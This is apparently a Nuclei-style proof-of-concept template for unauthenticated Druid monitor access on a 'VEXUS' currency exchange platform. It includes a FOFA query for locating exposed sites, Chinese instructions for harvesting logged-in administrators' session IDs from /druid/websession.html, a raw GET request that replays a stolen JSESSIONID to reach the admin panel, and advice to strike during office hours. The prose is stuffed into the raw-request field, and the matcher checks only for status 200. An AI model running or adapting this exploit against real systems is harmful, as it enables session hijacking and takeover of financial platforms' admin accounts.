id: poc-ntuufu3951s9g3g8
info:
  name: VEXUS多语言货币交易所存在Druid 未授权访问漏洞
  author: hacktwo
  severity: medium
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ntuufu3951s9g3g8'
  tags: unauth,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: ntuufu3951s9g3g8
    fofa: '"image/n2.png" && "public/login.action"'
http:
- raw:
  - 'Druid版本为 1.2.8，存在未授权访问漏洞，直接访问 /druid/index.html 即可进入

    访问 /druid/websession.html 这里还存储了所有登陆后台的Session，只需要找到可用Session的即可直接绕过登录后台。

    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739445796645-986e8d28-0c77-4218-a273-984c20fd93a1.png)

    GET /normal/LoginSuccessAction!view.action?username=admin HTTP/1.1

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7

    Cache-Control: no-cache

    Connection: keep-alive

    Cookie: JSESSIONID=可用的SESSION

    Host: {{Hostname}}

    Pragma: no-cache

    Upgrade-Insecure-Requests: 1


    PS:该漏洞利用比较简单，但是在利用时，运气也是占非常大的成分。只有当用户在线时，才可以拿到有效的Session进行利用，要不然拿着一堆过期的Session是没有任何作用的。在利用时可以根据时间点进行利用，比如上班时间，肯定会有大量用户进行登录，这样可能利用成功的可能性是比较大的。'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
